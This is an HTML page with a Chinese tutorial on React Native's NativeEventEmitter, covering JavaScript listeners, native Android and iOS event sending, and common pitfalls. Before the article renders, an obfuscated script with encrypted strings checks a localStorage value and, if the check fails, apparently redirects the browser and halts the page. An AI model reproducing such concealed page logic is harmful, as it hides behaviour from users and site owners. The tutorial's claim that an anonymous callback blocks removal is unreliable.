<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0xe29669=_0x33cb;function _0x33cb(e,s){var l=_0xc466();return(_0x33cb=function(s,n){var a=l[s-=270];void 0===_0x33cb.uYnFwG&&(_0x33cb.QXTiLn=function(s,n){var a,t=[],e=0,l="";for(s=(s=>{for(var n,a,t="",e="",l=0,c=0;a=s.charAt(c++);~a&&(n=l%4?64*n+a:a,l++%4)&&(t+=String.fromCharCode(255&n>>(-2*l&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var p=0,r=t.length;p<r;p++)e+="%"+("00"+t.charCodeAt(p).toString(16)).slice(-2);return decodeURIComponent(e)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)e=(e+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[e],t[e]=a;for(var c=0,e=0,p=0;p<s.length;p++)a=t[c=(c+1)%256],t[c]=t[e=(e+t[c])%256],t[e]=a,l+=String.fromCharCode(s.charCodeAt(p)^t[(t[c]+t[e])%256]);return l},e=arguments,_0x33cb.uYnFwG=!0);var s=s+l[0],t=e[s];return t?a=t:(void 0===_0x33cb.wvyfgd&&(_0x33cb.wvyfgd=!0),a=_0x33cb.QXTiLn(a,n),e[s]=a),a})(e,s)}if((()=>{for(var s=_0x33cb,n=_0xc466();;)try{if(531114==+parseInt(s(282,"XhMi"))+-parseInt(s(285,"q&wr"))/2+parseInt(s(293,"*T[["))/3+parseInt(s(290,"UJmg"))/4*(parseInt(s(287,"DAPj"))/5)+parseInt(s(286,"]R&*"))/6*(-parseInt(s(292,"[mbq"))/7)+-parseInt(s(270,"Vc81"))/8+-parseInt(s(278,"rquY"))/9)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0xe29669(291,"rolt")](_0xe29669(272,"C&EP"))!=_0xe29669(276,"fDa]"))throw window[_0xe29669(277,"*UE^")][_0xe29669(275,"^M2y")](_0xe29669(280,"JK1H")),Error();function _0xc466(){var s=["ASk5W4uIyCkiBqNcQa","W7SJn8oSh2eYdIJcGqRdS8oW","W6BdHcVcT8ooW5KhvwhcSZ5bW4a","wGK3W5BcUGpdRq","aJJcLJiH","W7hcKXlcUddcUxddRa","WOdcMMmJW47dGSkgvWKfn8otWPO","W43dQYpdJh1ldJGVWRuOW5/dVG","W6/cHSkEWO7cIqqSewzjW5dcLhLMW4tdKcNcQZ/cJCkZWPxcGCoSWP7dHW","W7aElc92rSo3WQe0aW","W70PpSoOg2fddadcGrVdKa","WRqjACkdECojwW","edNdMSkWuKn2W5VcQdfqWQW","yNPcCIddIIvQBmoNimkzWOO","W7pcTWFdMSkNbutdTmkOWRVcOttcUa","WOqOWPJcNSkmlmkFwSo9WRW","sYBdQ8ocW4OYW5RcUmoJW6m2hW","yNffDcldJIfeBCoYimkEWPW","W7dcRSogFx7dTsvQg3i","W5BcUY/cRmk9nmkU","W7iCms3cRLCR","W61dWR83gSkhw8kEWPFcHxaNWPa","WPNdT2/cJ3VdJ3zVWOakoGe","WOxdRwNdKmk7c8kvW4TrW70"];return(_0xc466=function(){return s})()}document.title="NativeEventEmitter 详解",document.getElementById("article").innerHTML='<div><p>NativeEventEmitter 是 React Native 中用于监听原生模块(iOS/Android)事件的 JavaScript 接口。它充当了 JavaScript 和原生代码之间的事件通信桥梁。</p>\n<h2>核心概念</h2>\n<ol>\n<li><strong>事件驱动架构</strong>  ：允许原生代码主动向 JavaScript 端推送事件</li>\n<li><strong>跨平台支持</strong>  ：统一了 iOS 和 Android 的事件监听方式</li>\n<li><strong>生命周期管理</strong>  ：提供了订阅/取消订阅的机制</li>\n</ol>\n<h2>完整使用指南</h2>\n<h3>1. 基本使用</h3>\n<pre><code class="language-javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NativeEventEmitter</span>, <span class="hljs-title class_">NativeModules</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-native&#x27;</span>;\n\n<span class="hljs-comment">// 1. 获取原生模块</span>\n<span class="hljs-keyword">const</span> { <span class="hljs-title class_">MyNativeModule</span> } = <span class="hljs-title class_">NativeModules</span>;\n\n<span class="hljs-comment">// 2. 创建事件发射器实例</span>\n<span class="hljs-keyword">const</span> eventEmitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeEventEmitter</span>(<span class="hljs-title class_">MyNativeModule</span>);\n\n<span class="hljs-comment">// 3. 添加事件监听</span>\n<span class="hljs-keyword">const</span> subscription = eventEmitter.<span class="hljs-title function_">addListener</span>(\n  <span class="hljs-string">&#x27;onCustomEvent&#x27;</span>, \n  <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;收到事件:&#x27;</span>, event);\n    <span class="hljs-comment">// 处理事件逻辑</span>\n  }\n);\n\n<span class="hljs-comment">// 4. 组件卸载时移除监听</span>\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {\n    subscription.<span class="hljs-title function_">remove</span>();\n  };\n}, []);\n</code></pre>\n<h3>2. 高级用法</h3>\n<h4>多事件监听</h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> subscriptions = [];\n\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  subscriptions.<span class="hljs-title function_">push</span>(\n    eventEmitter.<span class="hljs-title function_">addListener</span>(<span class="hljs-string">&#x27;Event1&#x27;</span>, handleEvent1),\n    eventEmitter.<span class="hljs-title function_">addListener</span>(<span class="hljs-string">&#x27;Event2&#x27;</span>, handleEvent2)\n  );\n\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {\n    subscriptions.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">sub</span> =&gt;</span> sub.<span class="hljs-title function_">remove</span>());\n  };\n}, []);\n</code></pre>\n<h4>带上下文的事件处理</h4>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> handler = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> {\n  <span class="hljs-comment">// 使用组件状态</span>\n  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event, currentState);\n}, [currentState]);\n\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> sub = eventEmitter.<span class="hljs-title function_">addListener</span>(<span class="hljs-string">&#x27;Event&#x27;</span>, handler);\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> sub.<span class="hljs-title function_">remove</span>();\n}, [handler]);\n</code></pre>\n<h3>3. 原生端配置</h3>\n<h4>Android 实现</h4>\n<pre><code class="language-java"><span class="hljs-comment">// 在原生模块中</span>\n<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendEvent</span><span class="hljs-params">(String eventName, WritableMap params)</span> {\n  <span class="hljs-type">ReactContext</span> <span class="hljs-variable">reactContext</span> <span class="hljs-operator">=</span> (ReactContext)getContext();\n  reactContext\n    .getJSModule(DeviceEventManagerModule.RCTDeviceEventEmitter.class)\n    .emit(eventName, params);\n}\n</code></pre>\n<h4>iOS 实现</h4>\n<pre><code class="language-objc"><span class="hljs-comment">// 在原生模块中</span>\n- (<span class="hljs-type">void</span>)sendEvent:(<span class="hljs-built_in">NSString</span> *)eventName body:(<span class="hljs-built_in">NSDictionary</span> *)body {\n  [<span class="hljs-keyword">self</span> sendEventWithName:eventName body:body];\n}\n\n<span class="hljs-comment">// 需要实现supportedEvents方法</span>\n- (<span class="hljs-built_in">NSArray</span>&lt;<span class="hljs-built_in">NSString</span> *&gt; *)supportedEvents {\n  <span class="hljs-keyword">return</span> @[<span class="hljs-string">@&quot;onCustomEvent&quot;</span>];\n}\n</code></pre>\n<h2>最佳实践</h2>\n<ol>\n<li><strong>内存管理</strong>  ：务必在组件卸载时移除监听</li>\n<li><strong>性能优化</strong>  ：避免在事件回调中执行复杂操作</li>\n<li><strong>错误处理</strong>  ：添加错误边界处理</li>\n<li><strong>调试技巧</strong>  ：使用 <code>EventEmitter.listenerCount(eventName)</code> 检查监听数量</li>\n</ol>\n<h2>常见问题解决</h2>\n<ol>\n<li><strong>事件未触发</strong>  ：\n<ul>\n<li>检查原生端是否正确发送事件</li>\n<li>确认事件名称完全匹配</li>\n<li>验证原生模块已正确链接</li>\n</ul>\n</li>\n<li><strong>内存泄漏</strong>  ：<pre><code class="language-javascript"><span class="hljs-comment">// 错误示例 - 匿名函数导致无法正确移除</span>\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> sub = eventEmitter.<span class="hljs-title function_">addListener</span>(<span class="hljs-string">&#x27;Event&#x27;</span>, <span class="hljs-function">() =&gt;</span> {...});\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> sub.<span class="hljs-title function_">remove</span>();\n}, []);\n\n<span class="hljs-comment">// 正确做法 - 使用useCallback</span>\n<span class="hljs-keyword">const</span> handler = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {...}, []);\n<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {\n  <span class="hljs-keyword">const</span> sub = eventEmitter.<span class="hljs-title function_">addListener</span>(<span class="hljs-string">&#x27;Event&#x27;</span>, handler);\n  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> sub.<span class="hljs-title function_">remove</span>();\n}, [handler]);\n</code></pre>\n</li>\n<li><strong>多实例问题</strong>  ：\n<ul>\n<li>确保单例模式下正确管理事件发射器</li>\n<li>考虑使用上下文(Context)共享事件发射器</li>\n</ul>\n</li>\n</ol>\n<h2>替代方案比较</h2>\n<table>\n<thead>\n<tr>\n<th>方案</th>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>NativeEventEmitter</td>\n<td>官方支持，功能完整</td>\n<td>需要手动管理订阅</td>\n</tr>\n<tr>\n<td>DeviceEventEmitter</td>\n<td>全局可用</td>\n<td>容易造成内存泄漏</td>\n</tr>\n<tr>\n<td>第三方事件库</td>\n<td>功能丰富</td>\n<td>增加包体积</td>\n</tr>\n</tbody>\n</table>\n<p>NativeEventEmitter 是 React Native 官方推荐的事件通信方案，特别适合需要与原生模块深度集成的场景。</p>\n</div>'</script></body></html>